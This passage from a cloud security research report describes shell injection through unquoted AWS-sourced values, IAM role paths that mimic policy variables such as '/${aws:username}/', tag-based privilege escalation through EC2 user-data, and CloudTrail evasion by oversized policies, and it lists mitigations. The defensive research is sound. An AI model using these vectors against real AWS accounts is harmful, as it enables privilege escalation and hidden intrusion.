If `DatabaseName` or `DatabasePassword` are `String` type parameters **without `AllowedPattern` or `AllowedValues` constraints**, a user supplying the parameter could inject arbitrary bash commands. AWS pseudo-parameters (`AWS::StackName`, `AWS::Region`) are safe as they are AWS-controlled. Rhino Security Labs documented a related attack where CloudFormation templates are [modified in-transit on S3 before deployment](https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/).

#### 7.4b `aws/aws-app-mesh-examples` — Confirmed Unquoted Variables (Fixed)

**Issue:** [aws/aws-app-mesh-examples #46](https://github.com/aws/aws-app-mesh-examples/issues/46) "Unquoted variables in bash scripts"
**Fix:** [PR #48](https://github.com/aws/aws-app-mesh-examples/pull/48)

Unquoted bash variables across the project's shell scripts were identified and fixed. Demonstrates this vulnerability class is recognized but only addressed reactively.

#### 7.4c Account Name/Alias Character Validation Mismatch

**Repo:** [awslabs/aws-deployment-framework](https://github.com/awslabs/aws-deployment-framework/issues/260)

Account **names** allow Unicode and spaces (`[\u0020-\u007E]+`) while account **aliases** require `^[a-z0-9](([a-z0-9]|-(?!-))*[a-z0-9])?$`. When ADF code attempts to set account name as alias without validation, it fails for names with special characters. Not a shell injection vector, but demonstrates the pattern of identity values exceeding expected character sets across AWS services.

---

## 8. Related Security Research

| Research | Relevance |
|----------|-----------|
| **CVE-2025-5277** (aws-mcp-server) | Critical (CVSS 9.6) command injection in AWS MCP server's `cli_executor.py`. Shell metacharacters in parameters executed as commands. |
| **Stedi STS Bug** | `${...}` variable substitution in trust policies caused incorrect policy evaluation. AWS patched this. |
| **whoAMI Attack** (Datadog, Feb 2025) | Resource name confusion attack causing RCE. Demonstrates naming edge cases are actively exploited. |
| **Rhino Security Labs** | 21+ IAM privilege escalation methods, focused on permission misconfigs. |
| **Bishop Fox iam-vulnerable** | 250+ vulnerable IAM resources, 31 escalation paths. |
| **CloudTrail Evasion via Policy Size** (Permiso) | Policies 102-131KB cause CloudTrail to log only "requestParameters too large", hiding malicious content. |
| **OIDC Trust Policy Wildcards** | Misconfigured OIDC conditions with wildcards enable cross-tenant role assumption. |
| **CVE-2025-11621** (HashiCorp Vault) | Cross-account role impersonation via cache key collision. |

---

## 9. Key Takeaways

1. **`$` cannot appear in IAM role names**, but **CAN appear in IAM role paths** per the API validation regex.
2. This means an IAM role ARN can contain `$` in the path segment: `arn:aws:iam::ACCT:role/$path/RoleName`
3. Creating role paths that mimic IAM policy variables (e.g., `/${aws:username}/`) creates a **confusion attack surface** where policy authors may inadvertently create dynamic policies instead of static ones.
4. Both `ArnEquals` and `ArnLike` treat `*` and `?` as wildcards, and these characters are valid in role paths.
5. This intersection of role paths containing `${...}` patterns and IAM policy variable substitution appears to be an **under-explored area** in cloud security research — no published CVE, conference talk, or dedicated blog post was found covering this specific attack vector.
6. **The broader attack surface extends far beyond role ARNs.** Any AWS identifier with user-controlled characters — tag values, S3 object keys, SSM parameters, Secrets Manager values, CloudFormation parameters, STS external IDs — can be an injection vector when it flows into a shell command without quoting.
7. **`ec2:CreateTags` is a hidden privilege escalation primitive** when instances consume tag values in user-data scripts (which run as root).
8. **`eval`/`source` with AWS-sourced data is the most critical anti-pattern**, found across Secrets Manager wrappers, EC2 tag converters, and STS credential helpers.
9. **Official AWS sample repos propagate unsafe patterns** — the `$EKS_KUBECTL_ROLE_ARN` anti-pattern originates from `aws-samples/eks-workshop` and has spread to dozens of repos and tutorials.
10. Mitigations: always quote variable expansions in shell (`"$VAR"`), never use `eval`/`source` with external data, restrict path/tag creation via SCPs, validate ARNs with awareness of the full allowed character set, use `boto3`/SDK calls instead of shelling out to the AWS CLI, and use `--password-stdin` for Docker login.
